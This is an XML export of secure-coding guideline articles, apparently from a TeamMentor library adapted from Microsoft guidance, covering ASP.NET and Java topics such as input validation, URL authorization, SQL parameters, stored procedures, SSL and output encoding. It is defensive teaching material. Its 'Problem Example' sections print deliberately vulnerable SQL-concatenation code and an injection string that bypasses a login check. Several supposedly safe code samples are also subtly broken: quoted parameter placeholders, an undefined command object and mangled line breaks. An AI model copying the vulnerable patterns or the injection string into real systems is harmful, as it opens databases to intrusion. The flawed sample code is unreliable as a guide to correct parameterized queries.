sub<br>&lt;/script&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;Validation Sample&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form runat=server&gt;<br>&lt;asp:ValidationSummary runat=server headertext="There were errors on the page:" /&gt;<br>&lt;table&gt;<br>  &lt;tr&gt;<br>    &lt;td&gt;<br>        &lt;asp:RequiredFieldValidator runat=server<br>             controltovalidate="WidgetQuantity"<br>             errormessage="WidgetQuantity is required."&gt;<br>        &lt;/asp:RequiredFieldValidator&gt;<br>    &lt;/td&gt;<br>    &lt;td&gt;A widget's current price is $19.95 USD. Please use the following form to submit an order.&lt;/td&gt;<br>    &lt;td&gt;<br>      &lt;select name="WidgetQuantity"&gt;<br>        &lt;option value="1"&gt;1&lt;/option&gt;<br>        &lt;option value="2"&gt;2&lt;/option&gt;<br>        &lt;option value="3"&gt;3&lt;/option&gt;<br>        &lt;option value="4"&gt;4&lt;/option&gt;<br>      &lt;/select&gt;<br>     &lt;asp:RegularExpressionValidator runat=server display=dynamic<br>            controltovalidate="WidgetQuantity"<br>            errormessage="WidgetQuantity must be a non-zero, positive integer." <br>            validationexpression="[1-9]{1}[0-9]{0,7}" /&gt;<br>    &lt;/td&gt;<br>  &lt;/tr&gt;<br>...<br>&lt;/table&gt;<br>&lt;br&gt;<br>&lt;input type=submit runat=server id=cmdSubmit value=Submit onserverclick=OnSubmit&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;</pre><p>The ASP.NET Validator control provides client-side validation to reduce roundtrips to the server and improve user experience, but also provides server-side validation to ensure that the widget quantity field is a positive integer. It is also validated as a required field that must be provided before submitting the order.</p><h1>Related Items</h1><ul><li><a href="ruledisplay:58F9B51D-794F-4CFC-B568-7F5E55DEB402">Guideline: Do Not Rely on Client-Side Validation </a></li><li><a href="ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909">Guideline: Validate Input for Length, Range, Format, and Type </a></li><li><a href="ruledisplay:3437DF81-6B8C-4A14-BB6E-34F6EE21C45F">Guideline: Use Type Safe SQL Parameters When Constructing SQL Queries</a> </li><li><a href="ruledisplay:179C1FD4-A8DA-466B-81EF-202DF7561536">Guideline: Do Not Make Security Decisions Based on Client-Accessible Parameters</a> </li><li><a href="ruledisplay:897EEB0A-23C9-4699-A400-925FFC32C11E">Guideline: Filter All User-Supplied Filename and Path Input</a> </li><li><a href="ruledisplay:1AB38C50-F31D-4CD8-89B1-CE397E6895E8">Guideline: Encode All Output Data</a> </li><li><a href="ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E">Attack: Cross Site Scripting Attack</a> </li><li><a href="ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764">Attack: SQL Injection Attack</a> </li><li><a href="ruledisplay:044B9F0A-6A95-442C-BF24-3F890D0B10EF">Attack: Client-side Validation Attack</a> </li><li><a href="ruledisplay:208A476B-ABCA-4630-9D02-746C52F47017">Attack: XML Injection Attack</a> </li><li><a href="ruledisplay:198CBDAF-3F87-4291-870D-8B6F077D8D36">Attack: AJAX Injection Attack</a> </li><li><a href="ruledisplay:2B17E816-C6C4-4B05-BE92-01DC71073F66">Attack: Response Splitting Attack</a> </li><li><a href="ruledisplay:1CCC080F-9290-4BD2-8A2C-6A45F59727B0">Attack: Xpath-XQuery Attack</a> </li><li><a href="ruledisplay:092BC54D-5A7F-451F-9EB1-AB0A1F1708C0">Attack: LDAP Injection Attack</a> </li><li><a href="ruledisplay:685CA8C0-E102-4517-A539-4B826D1962EB">Attack: Double Encoding Attack</a> </li><li><a href="ruledisplay:B9DD25F1-3C5C-40DD-A82E-464D0C02C14D">Attack: Command Injection Attack</a> </li><li><a href="ruledisplay:41BACAD4-8875-4F83-A9F6-C2263B23ABC4">Attack: File Name and Path Manipulation Attack</a> </li><li><a href="ruledisplay:C7AC7D00-4AEA-4AFA-AD2D-1E812664BA38">Attack: Canonicalization Attack</a> </li><li><a href="ruledisplay:A50EAF02-034A-491B-A340-557BE0681C48">Checklist Item: Request Validation is Not Relied on </a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1042424734" Content_Hash="-1400433876">
    <Metadata>
      <Id>3651c42d-4155-44b5-8645-629d9cacba07</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use URL Authorization for Page and Directory Access Control</Title>
      <Category>Authorization</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use URL authorization to control which users and groups of users have access to the application or to parts of the application. </p><h1>Why</h1><p>Rather than having to password protect pages, URL Authorization allows you to tie page access to user accounts or roles.&nbsp;&nbsp;</p><h1>When</h1><p>If your application restricts access to some pages use URL Authorization to enforce these restrictions.</p><h1>How</h1><p>To configure URL authorization, use an &lt;<strong>authorization</strong>&gt; element in Web.config and specify which user and/or role names are allowed access to the current directory or the nominated directory or file. ASP.NET on Windows Server 2003 or later protects all files in a given directory, even those not mapped to ASP.NET, such as .html, .gif, and .jpg files. </p><p>Authorization settings in Web.config refer to all of the files in the current directory and all subdirectories unless a subdirectory contains its own Web.config with an &lt;<strong>authorization</strong>&gt; element. In this case, the settings in the subdirectory override the parent directory settings. </p><p>URL authorization can be used for both forms authentication and Windows authentication. In the case of Windows authentication, user names take the form "DomainName\WindowsUserName" and role names take the form "DomainName\WindowsGroupName". The local administrators group is referred to as "BUILTIN\Administrators". The local users group is referred to as "BUILTIN\Users". The following example shows Windows users and Windows roles. </p><pre>&lt;authorization&gt;  <br>&lt;allow users="DomainName\Bob, DomainName\Mary" /&gt;  <br>&lt;allow roles="BUILTIN\Administrators, DomainName\Manager" /&gt;  <br>&lt;deny users="*" /&gt;<br>&lt;/authorization&gt;  </pre><p>The following example uses a custom role. </p><pre>&lt;authorization&gt;  <br>&lt;allow roles="Manager"/&gt;  <br>&lt;deny users="*"/&gt;<br>&lt;/authorization&gt;  </pre><p>To apply authorization rules to a specific file or folder, enclose the &lt;<strong>authorization</strong>&gt; element inside a &lt;<strong>location</strong>&gt; element as shown here. </p><pre>&lt;location path="Secure" &gt;  <br>&lt;system.web&gt;    <br>&lt;authorization&gt;      <br>&lt;deny users="?" /&gt;    <br>&lt;/authorization&gt;  <br>&lt;/system.web&gt;<br>&lt;/location&gt;  </pre><p>This example denies access to unauthenticated users and forces a redirect to the login page that is specified on the &lt;<strong>forms</strong>&gt; element. </p><p>The following example shows how you can apply authorization to a specific file (Page.aspx). </p><pre>&lt;location path="page.aspx"&gt;    <br>&lt;authorization&gt;        <br>...    <br>&lt;/authorization&gt;<br>&lt;/location&gt;  </pre><p>If necessary, you can apply different authorization rules for separate pages based on the identity, or more commonly, the role membership of the caller, by using multiple &lt;<strong>authorization</strong>&gt; elements within separate &lt;<strong>location</strong>&gt; elements. </p><h1>Related Items</h1><ul><li><div><a href="ruledisplay:a4f34081-56ae-4a7a-9b90-be4bc68e0402">URL Authorization is used for Page and Directory Access Control</a></div></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="87554228" Content_Hash="1233623451">
    <Metadata>
      <Id>387ba9ba-9ea5-4ab2-8c00-cfb169557daa</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use Type Safe SQL Parameters when Constructing SQL Queries</Title>
      <Category>Data Access</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>1</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use type-safe parameters when constructing dynamic SQL queries or when passing parameters to stored procedures. </p><h1>Why</h1><p>If you use the Parameters collection, SQL treats the input is as a literal value rather then as executable code. The Parameters collection can be used to enforce type and length constraints on input data. Values outside of the range trigger an exception. If type safe SQL parameters are not used, attackers might be able to execute injection attacks that are embedded in the unfiltered input.</p><h1>When</h1><p>This guideline is applicable whenever there is an SQL statement that is built dynamically. It is also appropriate whenever stored procedures are utilized.</p><h1>How</h1><p>One way of making the application less susceptible to SQL injection attacks is by using stored procedures. Stored procedures are subroutines stored in the database that are available to applications for accessing the data. </p><p>Just using stored procedures isn't a complete remedy for SQL injection. The important thing to do is use parameters with stored procedures, else, your stored procedures can be susceptible to SQL injection if they use unfiltered input. Stored procedures provide several security advantages:</p><ul><li>By parameterizing input parameters and type enforcing them, user input is effectively filtered </li><li>Stored procedures are allowed to execute under different security privileges from the database user by most databases, thereby restricting the ability of the application to do anything beyond the actions specified in the stored procedures. For instance, an application would have execute access to a stored procedure, but no access to the base tables.</li></ul><p>To use type safe SQL parameters, follow these steps:</p><ol><li><p><strong>If possible, use stored procedures.</strong> Stored procedures are pre-compiled statements that are stored on the database server. Using stored procedures improves your application's performance and security. Consult the <a href="ruledisplay:8F360E73-D932-4512-84B4-2D7A6632DA7F">Use Stored Procedures</a> guideline for more details.</p></li><li><p><strong>Determine the parameters in the SQL query or stored procedure being constructed.</strong> All parameters that result from user input or another untrusted source should be escaped, by specifying variable names in the query:</p><pre>SELECT * from books WHERE ISBN = '@isbn'</pre></li><li><p><strong>Declare the explicit data types for each parameter in the SQL statement.</strong> When executing the SQL statement, specify the data type and length for each parameter in the query:</p><pre>myCommand.SelectCommand.Parameters.Add("@isbn", SqlDbType.VarChar, 10);</pre></li><li><p><strong>Specify the value for each parameter.</strong> The untrusted input is then specified, so that it can be properly handled when the SQL statement executes:</p><pre>myCommand.SelectCommand.Parameters["@isbn"].Value = '0494483923';</pre></li></ol><h1>Problem Example</h1><p>Consider an ASP.NET application that handles employee payroll functionality for a small company. One of the pages requires retrieving an employee record from a table based on a username and password supplied via a login dialog. The developer of the application created an SQL SELECT query to accomplish said task:</p><pre>using (SqlConnection myConnection = new SqlConnection(connectionString))<br><pre>SqlConnection myConnection = new SqlConnection("Data Source=localhost\\sqlexpress;<br>            Initial Catalog=EmployeePayroll;<br>            Integrated Security=True");<br>string SQLstr = "SELECT * from users WHERE username = '" + un.Text + <br>              "' AND password = '" + <br>              pass.Text + "'";</pre><pre>SqlCommand myCommand = new SqlCommand(SQLstr, myConnection);</pre><pre>SqlDataAdapter myDataAdapter = new SqlDataAdapter(myCommand);</pre><pre>myCommand.Connection.Open();</pre><pre>SqlDataReader myReader = myCommand.ExecuteReader();<br></pre></pre><p>In the preceding example, the SELECT statement will work as expected, assuming that the input is perfectly constrained. However, what happens if a user enters unexpected input such as '1234' for a password, and this for a username:</p><pre>mjones' AND 1=1; -- </pre><p>This will result in the SQL statement being executed at the database level:</p><pre>SELECT * from users WHERE username = 'mjones' AND 1=1; --'  AND password = '1234';</pre><p>This will allow the person entering data into the dialog box to select the account details of mjones without the correct password.</p><h1>Solution Example</h1><p>Consider an ASP.NET application that handles employee payroll functionality for a small company. One of the pages requires retrieving an employee record from a table based on a username and password supplied via a login dialog. The developer of the application uses the following SQL query to take advantage of type safe parameters with the SqlParameterCollection when constructing the query dynamically:</p><pre><pre>using System.Data;<br>using System.Data.SqlClient;</pre><pre>using (SqlConnection connection = new SqlConnection(connectionString))<br>{<br>&nbsp; DataSet userDataset = new DataSet();<br>&nbsp; SqlDataAdapter myDataAdapter = new SqlDataAdapter(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "SELECT * from users WHERE username = <a href="mailto:'@uname'">'@uname'</a> AND password = <a href="mailto:'@pwd'">'@pwd'</a>", connection);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp; myCommand.SelectCommand.Parameters.Add("@uname", SqlDbType.VarChar, 24);<br>&nbsp; myCommand.SelectCommand.Parameters.Add("@pwd", SqlDbType.VarChar, 16);</pre><pre>  myCommand.SelectCommand.Parameters["@uname"].Value = un.Text;</pre><pre>  myCommand.SelectCommand.Parameters["@pwd"].Value = pass.Text;<br><br>&nbsp; myDataAdapter.Fill(userDataset);<br>}<br></pre></pre><p>In the preceding code example, the input values are constrained for length and escaped. If the data does not conform to the type or length defined by the parameter, the SqlParameter class throws an exception.</p><h1>Additional Resources</h1><ul><li>To learn more about SQL injection, see: <a href="http://en.wikipedia.org/wiki/SQL_injection">SQL Injection</a> in Wikipedia. </li><li>To learn more about countering SQL injection in ASP.NET, visit: <a href="http://msdn2.microsoft.com/en-us/library/ms998271.aspx">How To: Protect From SQL Injection in ASP.NET</a>. </li><li>To learn more about countering injection-based attacks in ASP.NET, see: <a href="http://msdn2.microsoft.com/en-us/library/bb355989.aspx">How To: Protect From Injection Attacks in ASP.NET</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:F1B74837-9A72-4745-A149-EC5D8C476EB7">Guideline: Validate All Input Passed to Database </a></li><li><a href="ruledisplay:8F360E73-D932-4512-84B4-2D7A6632DA7F">Guideline: Use Stored Procedures </a></li><li><a href="ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6">Attack: Server-Side Code Injection Attack</a> </li><li><a href="ruledisplay:22BE1EE0-7DA4-4571-8D58-3ED211A05947">Checklist Item: Type Safe SQL Parameters are Used </a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="166855393" Content_Hash="1701196091">
    <Metadata>
      <Id>3ace3004-81fc-4876-b9c6-effd6f351112</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use SSL to Protect User Credentials and Authentication Cookies</Title>
      <Category>Authentication</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use Secure Sockets Layer (SSL) to protect the authentication credentials and authentication cookies passed between browser and server. </p><h1>Why</h1><p>By using SSL, you make it much more difficult for an attacker to monitor the network connection and obtain authentication credentials and capture authentication cookies to gain spoofed access to your application. </p><p>SSL also can improve user trust in your application as it authenticates the server to the client, thus proving the end point for communications.</p><h1>When</h1><p>SSL should be used for forms based authentication. </p><p>If you cannot use SSL, reduce the session lifetime with the timeout attribute on the forms element.</p><h1>How</h1><ol><li><p><strong>Restrict the authentication cookie to HTTPS connections. </strong>Cookies support a "secure" property that determines whether or not browsers should send the cookie back to the server. With the secure property set, the cookie is sent by the browser only to a secure page that is requested using an HTTPS URL.</p><p>Set the secure property by using <strong>requireSSL="true"</strong> on the <strong>&lt;forms&gt;</strong> element as follows:</p><pre>&lt;forms loginUrl="Secure\Login.aspx"<br>       requireSSL="true" . . . /&gt;&nbsp;</pre></li><li><p><strong>Encrypt the cookie and check its integrity. </strong>Encrypt the cookie and check its integrity, even if you are using SSL. This prevents an attacker from viewing or modifying the cookie if he or she manages to steal it through a XSS exploit. In this event, the attacker can still use the cookie to gain access to your application. The best way to mitigate this risk is to implement the appropriate countermeasures to prevent XSS attacks (described under "Cross-Site Scripting" earlier in this chapter), and limit the cookie lifetime as described in the next recommendation.</p><p>To provide privacy and integrity for the cookie, set the <strong>protection</strong> attribute on the <strong>&lt;forms&gt;</strong> element as follows:</p><blockquote><pre>&lt;forms protection="All"    Privacy and integrity&nbsp;</pre></blockquote><p>A secure &lt;<strong>forms</strong>&gt; element configuration is shown here:</p><pre>&lt;forms loginUrl="Secure\Login.aspx"<br>       protection="All"<br>       requireSSL="true"<br>       timeout="00:30:00" <br>       slidingExpiration="true"<br>       name="YourAppName"<br>       path="/Secure" /&gt;</pre></li></ol><h1>Related Items</h1><ul><li><div><a href="ruledisplay:f4b36918-6de8-40a6-96d3-de9e3499c89e">SSL is Used to Protect User Credentials and Authentication Cookies<br></a></div></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1079776515" Content_Hash="1992471098">
    <Metadata>
      <Id>4471ff4d-d052-4fe2-afd9-1c57a4bc0273</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use Stored Procedures</Title>
      <Category>Data Access</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>1</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Always use stored procedures when interacting with a database. This increases performance and reduces the risk of a successful SQL injection attack.</p><h1>Why</h1><p>Attackers can use a <a href="ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764">SQL Injection Attack</a> to manipulate the database in unforeseen ways. SQL injection allows an attacker to assume the credentials of the SQL account used to connect to the database, which may lead to arbitrary reading, writing, updating, or deleting of data. In an improperly secured database this can also lead to remote code execution through the use of certain stored procedures that allow for direct Operating System command injection.</p><h1>When</h1><p>Whenever interaction with a database is required</p><h1>How</h1><p>First the stored procedure will have to be created on the database, this can be done using the following SQL syntax:</p><pre>CREATE PROCEDURE <br>sp_AddNewUser( @UserName nvarchar(255), @Email  nvarchar(255), <br>@FirstName nvarchar(255), @LastName nvarchar(255)) AS</pre><pre>-- INSERT the new user<br>INSERT INTO Users_Table(UserName, Email, FirstName, LastName)<br>VALUES(@UserName, @Email, @FirstName, @LastName)<br>--This will return the new user’s IDSELECT SCOPE_IDENTITY()</pre><p>Now to call the stored procedure we can use the following .NET code:</p><pre>//create a new connection using our connection string<br>SqlConnection myConnection = new SqlConnection(connection string)<br>;myConnection.Open();<br>//create a new command that specifies our store procedure<br>SqlCommand myCommand = new SqlCommand("sp_AddNewUser", myConnection);<br>//Specify our command is a stored proceduremy<br>Command.CommandType = Command<br>Type.StoredProcedure;<br>//Create a new parameter to carry the username<br>SqlParameter UserParameter = new SqlParameter("@UserName", SqlDbType.VarChar);<br>UserParameter.Direction = ParameterDirection.Input;<br>UserParameter.Value = "TestUser";<br>//Add the parameter to the command<br>myCommand.Parameters.Add(UserParameter);<br>//Repeat this code to add commands for each parameter in the SPROC<br>//Execute the command on the Database<br>myCommand.ExecuteNonQuery();</pre><h1>Problem Example</h1><p>There are many ways to create a SQL injection vulnerability, and it’s even possible to do using stored procedures. The vulnerability lies in dynamically creating a SQL statement without bound parameters. In the following example the developer has built the SELECT statement by appending the components of the statements together with user provided input.</p><p>The developer wants to execute the following command where [username] is the username of the user whose e-mail we would like to return</p><pre>SELECT Email from Users_Table where <br>UserName = [username];<br></pre><pre>The following code will create that statement an execute it on the database:<br>//create a new connection using our connection string<br>SqlConnection myConnection = new SqlConnection(connection string);<br>myConnection.Open();<br>//create a new command that specifies our store procedure<br>string selectCommand = "SELECT Email from Users_Table WHERE UserName = "<br>         + userNameBox.Text;<br>SqlCommand myCommand = new SqlCommand(selectCommand);<br>//Execute the command on the Database<br>SqlDataReader myReader = myCommand.ExecuteReader();</pre><h1>Solution Example</h1><p>First a stored procedure needs to be created on the database, the following SQL syntax can be used to create the same select statement as above:</p><pre>CREATE PROCEDURE sp_ReturnEmail( @UserName nvarchar(255)) <br>ASSELECT Email FROM Users_Table where UserName = @UserName;</pre><p>Now the following code can be used to query the database using the stored procedure:</p><pre>//create a new connection using our connection string<br>SqlConnection myConnection = new SqlConnection(connection string);<br>myConnection.Open();<br>//create a new command that specifies our store procedure<br>SqlCommand myCommand = new SqlCommand("sp_ReturnEmail", myConnection);<br>//Specify our command is a stored procedure<br>myCommand.CommandType = CommandType.StoredProcedure;<br>//Create a new parameter to carry the username<br>SqlParameter UserParameter = new SqlParameter("@UserName", SqlDbType.VarChar);U<br>serParameter.Direction = ParameterDirection.Input;UserParameter.Value = [username];<br>//Add the parameter to the command<br>myCommand.Parameters.Add(UserParameter);<br>//Execute the command on the Database<br>SqlDataReader myReader = myCommand.ExecuteReader();</pre><h1>Additional Resources</h1><ul><li>To learn more about stored procedures, visit: <a href="http://en.wikipedia.org/wiki/Stored_procedure">Stored procedure</a>. </li><li>For more information on using stored procedures, visit: <a href="http://aspnet.4guysfromrolla.com/articles/062905-1.aspx">Returning a Scalar value from a Stored Procedure</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:3437DF81-6B8C-4A14-BB6E-34F6EE21C45F">Guideline: Use Type Safe SQL Parameters When Constructing SQL Queries </a></li><li><a href="ruledisplay:F1B74837-9A72-4745-A149-EC5D8C476EB7">Guideline: Validate All Input Passed to Database</a> </li><li><a href="ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764">Attack: SQL Injection Attack</a> </li><li><a href="ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6">Attack: Server-Side Code Injection Attack</a> </li><li><a href="ruledisplay:22BE1EE0-7DA4-4571-8D58-3ED211A05947">Checklist Item: Type Safe SQL Parameters are Used </a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1921146325" Content_Hash="484327814">
    <Metadata>
      <Id>47e03443-3e6b-4187-ad9a-843ad1ecdf5d</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use SSL Between Untrusted Server Applications</Title>
      <Category>Communication Security</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use an encrypted communication channel to protect data sent between servers.&nbsp;The Secure Sockets Layer (SSL) protocol can be used to secure the communication link between&nbsp;servers.&nbsp;&nbsp; </p><h1>Why</h1><p>Servers rarely co-exist in a secure environment.&nbsp;Eavesdropping and spoofing are threats when two or more entities must communicate over an untrusted medium such as the public internet, or even&nbsp;a LAN. Using SSL&nbsp;prevents&nbsp;attackers from&nbsp;monitoring the network connection to obtain authentication credentials in plain text. Not using SSL could allow an attacker&nbsp;to capture the authentication cookies&nbsp;and gain spoofed access to&nbsp;any applications that transmit data over the network.</p><h1>When</h1><p>If&nbsp;communicating&nbsp;servers are not inside a physically secure data center where the network eavesdropping threat is negligible,&nbsp;it&nbsp;is important to use an encrypted communication channel to protect data sent between servers. SSL is used when an application does not trust other applications on a server. Use SSL when granular channel protection for a particular application running on a server is needed&nbsp;rather than&nbsp;for all applications and services. It is also an appropriate choice when fixed ip addresses are not available. SSL only works with TCP/IP communication&nbsp;protocol as well as named pipes.</p><p>Use IPSec to help protect the communication channel between two servers and to restrict which computers can communicate with one another. For example, you can help protect a database server by establishing a policy that permits requests only from a trusted client computer such as an application or Web server. You can also restrict communication to specific IP protocols and TCP/UDP ports.</p><h1>How</h1><p>Here is how to use SSL&nbsp;to&nbsp;protect communication between servers:</p><ol><li><p>Install a Server Authentication Certificate on the server. </p></li><li><p>Install the Issuing CA's certificate&nbsp;so the&nbsp;two communicating applications may negotiate an SSL connection.&nbsp;</p></li><li><p>Use the "https://" connection protocol in the code to ensure traffic between the 2 server applications are encrypted.</p></li><li><p>Verify that Communication Is Encrypted. Use Network Monitor to verify that data sent between the application server and database server is encrypted. Start by sending data in clear text form and then enable encryption first by configuring the server and then by configuring the client.</p></li></ol><h1>Problem Example</h1><p>An e-commerce application written in ASP.NET enables customers to pay their bills online through a unified broker. The application's web component&nbsp;relies on an independant&nbsp;account management system that resides on another server. The web&nbsp;component communicates with the account management system using a SQL&nbsp;socket connection.&nbsp; The two servers&nbsp;are located in a competitively priced data center that houses a number of other customers, all of which are able&nbsp;to access the building&nbsp;at all times. A malicious user&nbsp;purchases hosting services at the same company, and&nbsp;after exploring the hosting environment, learns that the hosted accounts are networked using a shared&nbsp;bus topology&nbsp;that allows for network snooping. The attacker is able to setup a sniffer, and captures all of the communication between the account management component and the web component, since SQL connections are not encrypted by default. The attacker can now log in as a legitimate user&nbsp;on the account management server and make changes at will.&nbsp;&nbsp;</p><h1>Solution Example</h1><p>An e-commerce application written in ASP.NET enables customers to pay their bills online through a unified broker. The application's web component&nbsp;relies on an independant&nbsp;account management system that resides on another server. The web&nbsp;component communicates with the account management system using a SQL&nbsp;socket connection. The two servers&nbsp;are located in a competitively priced data center that houses a number of other customers, all of which are able&nbsp;to access the building&nbsp;at all times. The Developer of the application setup encrypted SSL traffic by installing a Server Authenticaion Certificate on the machine hosting the account management component, and installed the issuing CA's certificate on the&nbsp;server hosting the web component. &nbsp;The components use OLE-DB to communicate, so the developer inserted the following configuration directives in the web.config file:</p><pre>"Provider=SQLOLEDB.1;Integrated Security=SSPI;Persist Security <br>&nbsp; Info=False;Initial Catalog=Northwind;Data Source=sql01;Use <br>&nbsp; Encryption for Data=True"</pre><p>The developer then uses the following call to connect to the database using the SSL tunnel for data encryption:</p><pre>// Replace the server name in the following connection string with the name of your database <br>serverSqlConnection conn = new SqlConnection("server='sql01';<br>  database=NorthWind;IntegratedSecurity='SSPI'");</pre><p>Because&nbsp;traffic between the two components is encrypted, the transmission medium&nbsp;is&nbsp;less&nbsp;likely to affect the ability of the two components to communicate securely.</p><h1>Additional Resources</h1><ul><li>Using Secure Sockets Layer <a href="http://msdn2.microsoft.com/en-us/library/ds8bxk2a.aspx">http://msdn2.microsoft.com/en-us/library/ds8bxk2a.aspx</a> </li><li>Internet Protocol Version 6 <a href="http://msdn2.microsoft.com/en-us/library/3x7ak53z(VS.80).aspx">http://msdn2.microsoft.com/en-us/library/3x7ak53z(VS.80).aspx</a>&nbsp; </li><li>Wikipedia SSL encyclopedia entry <a href="http://en.wikipedia.org/wiki/Secure_Sockets_Layer">http://en.wikipedia.org/wiki/Secure_Sockets_Layer</a> </li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:ecfc4c67-2a6c-443e-844e-8a3051fe54f3">Use IPSsec to Encrypt Traffic Between Servers</a> </li><li><a href="ruledisplay:8afce3ed-b29f-4a25-ab8c-0d070383c7ad">Use SSL Between Untrusted Server Applications</a> </li><li><a href="ruledisplay:00b37bcb-5a47-41ca-9e84-a9e8edb15272">Use SSL Between the Web Browser and Web Server When Pages Need to be Encrypted</a> </li><li><a href="ruledisplay:de1299b9-854b-4479-9f26-bbc9df38af29">Use SSL or IPSec for Secure Communication Between Entities</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1556968893" Content_Hash="934498104">
    <Metadata>
      <Id>4880b800-8273-4ef5-b094-efa3d09e6e10</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Encode All Output Data</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><p>Applications written using Servlets or JSP.</p><h1>What to Do</h1><p>Encode all input that is displayed back to the user.</p><h1>Why</h1><p>Encoding echoed input prevents injection attacks such as cross-site scripting.</p><h1>When</h1><p>If user input will be echoed back to the client in any way, encode it first. This includes input that is immediately echoed back as well as input that is stored first (such as in a database) before being echoed back later.</p><h1>How</h1><p>Encoding the echoed user input prevents injection attacks such as cross-site scripting. Use the following steps to ensure all echoed input is encoded:</p><ol><li><p><strong>Identify all echoed input. </strong>Locate all places inside your application where user-supplied data will be returned to the client. Such data can be of reflective or persistent nature:</p><ul><li><strong>Reflective</strong>: In a reflective setting, the input is immediately returned to the client. For example, search engines present the searched query when displaying the results. </li><li><strong>Persistent</strong>: In a persistent setting, the input is stored and returned to the client at a different stage in your application. For example, message boards store the users' posts inside a database and return them when a given topic is viewed.</li></ul></li><li><p><strong>Determine the&nbsp;type of encoding. </strong>After identifying all echoed input, determine how the input is returned to client. Because input can take the form of HTML content or URLs, your application needs to use different encoding techniques:</p><ul><li><p><strong>URL encoding</strong>: URL encoding allows your application to maintain the original URL, yet display it to the user in a non-malicious way. Because HTTP headers allow a substitution schema, all characters/symbols are preserved by displaying their ASCII codes instead of the actual character/symbol. For example, <strong>&lt;</strong> is represented by <strong>%3C</strong> where <strong>3C</strong> is the ASCII value for <strong>&lt;</strong>:</p><blockquote><pre>String encodedUrl = URLEncoder.encode(url);</pre></blockquote></li><li><p><strong>HTML encoding</strong>: HTML encoding is used when the echoed input is returned as regular text or HTML content. Input should be encoded by substituting certain characters with their respective HTML values:</p><blockquote><table><tbody><tr><td>Character</td><td>HTML value</td></tr><tr><td>&lt;</td><td>&amp;lt;</td></tr><tr><td>&gt;</td><td>&amp;gt;</td></tr><tr><td>&amp;</td><td>&amp;amp;</td></tr><tr><td>"</td><td>&amp;quot;</td></tr></tbody></table></blockquote><p>JSP can also HTML encode a string through the use of <strong>{ }</strong> around the variable. <strong>{ }</strong> invoke JSP's built-in HTML 